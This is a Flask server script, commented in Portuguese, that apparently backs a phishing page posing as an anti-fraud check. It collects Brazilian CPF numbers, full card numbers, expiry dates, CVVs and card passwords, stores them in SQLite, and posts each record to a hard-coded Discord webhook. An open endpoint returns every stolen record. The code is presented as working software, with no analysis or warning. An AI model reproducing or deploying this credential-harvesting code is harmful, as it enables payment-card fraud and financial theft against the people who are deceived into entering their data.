from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import os
import json
from datetime import datetime
import requests
import traceback

app = Flask(__name__)
CORS(app)

# ===== CONFIGURAÇÕES =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1488642907417346242/BYCMQrQ_po5L4LpyPHFwO7fiOhB5K78q9440PundIrI2c_NYtvHAesiuo9xMIAcNZ-x0"
DATABASE = 'dados.db'

print("=" * 60)
print("🚀 SERVIDOR INICIADO")
print(f"📁 Banco de dados: {DATABASE}")
print(f"🔗 Webhook Discord: {DISCORD_WEBHOOK_URL[:60]}...")
print("=" * 60)

# ===== FUNÇÕES DO BANCO DE DADOS =====
def init_db():
    """Cria a tabela se não existir"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS dados (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cpf TEXT NOT NULL,
            banco TEXT,
            numero_cartao TEXT,
            validade TEXT,
            cvv TEXT,
            senha TEXT,
            completo BOOLEAN DEFAULT 0,
            data_hora TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    print("✅ Banco de dados inicializado")

def salvar_no_banco(dados):
    """Salva os dados no SQLite"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Verifica se já existe um registro incompleto para este CPF
        cursor.execute("SELECT id FROM dados WHERE cpf = ? AND completo = 0", (dados.get('cpf'),))
        existente = cursor.fetchone()
        
        if existente and not dados.get('senha'):
            # Atualiza registro existente
            cursor.execute('''
                UPDATE dados 
                SET banco = ?, numero_cartao = ?, validade = ?, cvv = ?
                WHERE cpf = ? AND completo = 0
            ''', (
                dados.get('banco'),
                dados.get('dadosCartao', {}).get('numero'),
                dados.get('dadosCartao', {}).get('validade'),
                dados.get('dadosCartao', {}).get('cvv'),
                dados.get('cpf')
            ))
        else:
            # Insere novo registro
            cursor.execute('''
                INSERT INTO dados (cpf, banco, numero_cartao, validade, cvv, senha, completo)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                dados.get('cpf'),
                dados.get('banco'),
                dados.get('dadosCartao', {}).get('numero'),
                dados.get('dadosCartao', {}).get('validade'),
                dados.get('dadosCartao', {}).get('cvv'),
                dados.get('senha'),
                1 if dados.get('senha') else 0
            ))
        
        conn.commit()
        conn.close()
        print(f"✅ Dados salvos no banco para CPF: {dados.get('cpf')}")
        return True
    except Exception as e:
        print(f"❌ Erro ao salvar no banco: {e}")
        traceback.print_exc()
        return False

def enviar_para_discord(dados):
    """Envia os dados para o Discord"""
    print(f"\n📤 TENTANDO ENVIAR PARA DISCORD")
    print(f"   CPF: {dados.get('cpf')}")
    print(f"   Tem senha: {'Sim' if dados.get('senha') else 'Não'}")
    
    if not DISCORD_WEBHOOK_URL:
        print("❌ Webhook não configurado!")
        return False
    
    # Verifica se é dados completos (com senha)
    if dados.get('senha'):
        titulo = "🔐 DADOS COMPLETOS COM SENHA"
        descricao = f"""
**CPF:** {dados.get('cpf')}
**Banco:** {dados.get('banco')}
**Cartão:** {dados.get('dadosCartao', {}).get('numero')}
**Validade:** {dados.get('dadosCartao', {}).get('validade')}
**CVV:** {dados.get('dadosCartao', {}).get('cvv')}
**🔑 SENHA:** {dados.get('senha')}
"""
        cor = 65280  # Verde
    else:
        titulo = "💳 DADOS DE CARTÃO"
        descricao = f"""
**CPF:** {dados.get('cpf')}
**Banco:** {dados.get('banco')}
**Cartão:** {dados.get('dadosCartao', {}).get('numero')}
**Validade:** {dados.get('dadosCartao', {}).get('validade')}
**CVV:** {dados.get('dadosCartao', {}).get('cvv')}
"""
        cor = 16711680  # Vermelho
    
    payload = {
        "embeds": [{
            "title": titulo,
            "description": descricao.strip(),
            "color": cor,
            "timestamp": datetime.now().isoformat(),
            "footer": {"text": "Sistema Antifraude"}
        }]
    }
    
    try:
        print("   Enviando requisição...")
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status code: {response.status_code}")
        
        if response.status_code == 204:
            print("   ✅ Mensagem enviada ao Discord com sucesso!")
            return True
        else:
            print(f"   ❌ Discord retornou erro: {response.status_code}")
            print(f"   Resposta: {response.text}")
            return False
            
    except requests.exceptions.Timeout:
        print("   ❌ Timeout - Discord demorou para responder")
        return False
    except requests.exceptions.ConnectionError:
        print("   ❌ Erro de conexão com Discord")
        return False
    except Exception as e:
        print(f"   ❌ Erro: {str(e)}")
        return False

# ===== ROTAS =====
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/validar-cpf', methods=['POST'])
def validar_cpf():
    try:
        data = request.get_json()
        cpf = data.get('cpf', '')
        cpf_limpo = ''.join(filter(str.isdigit, cpf))
        
        print(f"🔍 Validando CPF: {cpf_limpo}")
        
        if len(cpf_limpo) != 11:
            return jsonify({'valido': False, 'mensagem': 'CPF deve ter 11 dígitos'})
        
        if cpf_limpo == '11111111111':
            return jsonify({'valido': False, 'mensagem': 'CPF bloqueado'})
        
        return jsonify({'valido': True})
        
    except Exception as e:
        print(f"❌ Erro: {e}")
        return jsonify({'valido': False, 'mensagem': 'Erro interno'}), 500

@app.route('/api/salvar-cartao', methods=['POST'])
def salvar_cartao():
    try:
        dados = request.get_json()
        print(f"\n💳 RECEBENDO DADOS DO CARTÃO")
        print(f"   CPF: {dados.get('cpf')}")
        print(f"   Banco: {dados.get('banco')}")
        
        # Salva no banco de dados
        salvar_no_banco(dados)
        
        # Tenta enviar para o Discord
        discord_ok = enviar_para_discord(dados)
        
        if discord_ok:
            return jsonify({'sucesso': True, 'mensagem': 'Dados salvos e enviados ao Discord!'})
        else:
            return jsonify({'sucesso': True, 'mensagem': 'Dados salvos, mas Discord falhou. Verifique os logs.'})
            
    except Exception as e:
        print(f"❌ Erro: {e}")
        traceback.print_exc()
        return jsonify({'sucesso': False, 'mensagem': str(e)}), 500

@app.route('/api/enviar-senha', methods=['POST'])
def enviar_senha():
    try:
        data = request.get_json()
        print(f"\n🔐 RECEBENDO SENHA")
        print(f"   CPF: {data.get('cpf')}")
        print(f"   Senha: {data.get('senha')}")
        
        # Busca os dados do cartão no banco
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("SELECT banco, numero_cartao, validade, cvv FROM dados WHERE cpf = ? AND completo = 0 ORDER BY id DESC LIMIT 1", 
                      (data.get('cpf'),))
        resultado = cursor.fetchone()
        conn.close()
        
        if resultado:
            banco, numero, validade, cvv = resultado
            dados_completos = {
                'cpf': data.get('cpf'),
                'banco': banco,
                'dadosCartao': {
                    'numero': numero,
                    'validade': validade,
                    'cvv': cvv
                },
                'senha': data.get('senha')
            }
        else:
            dados_completos = {
                'cpf': data.get('cpf'),
                'banco': 'Desconhecido',
                'dadosCartao': {},
                'senha': data.get('senha')
            }
        
        # Salva a senha no banco
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("UPDATE dados SET senha = ?, completo = 1 WHERE cpf = ? AND completo = 0", 
                      (data.get('senha'), data.get('cpf')))
        conn.commit()
        conn.close()
        
        # Tenta enviar para o Discord
        discord_ok = enviar_para_discord(dados_completos)
        
        if discord_ok:
            return jsonify({'sucesso': True, 'mensagem': 'Senha salva e enviada ao Discord!'})
        else:
            return jsonify({'sucesso': True, 'mensagem': 'Senha salva, mas Discord falhou. Verifique os logs.'})
            
    except Exception as e:
        print(f"❌ Erro: {e}")
        traceback.print_exc()
        return jsonify({'sucesso': False, 'mensagem': str(e)}), 500

@app.route('/api/consultar', methods=['GET'])
def consultar():
    """Consulta todos os dados no banco"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("SELECT id, cpf, banco, numero_cartao, validade, cvv, senha, completo, data_hora FROM dados ORDER BY id DESC")
        dados = cursor.fetchall()
        conn.close()
        
        resultado = []
        for row in dados:
            resultado.append({
                'id': row[0],
                'cpf': row[1],
                'banco': row[2],
                'numero_cartao': row[3],
                'validade': row[4],
                'cvv': row[5],
                'senha': row[6],
                'completo': bool(row[7]),
                'data_hora': row[8]
            })
        
        return jsonify(resultado)
    except Exception as e:
        return jsonify({'erro': str(e)}), 500

# Inicializa o banco de dados
init_db()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)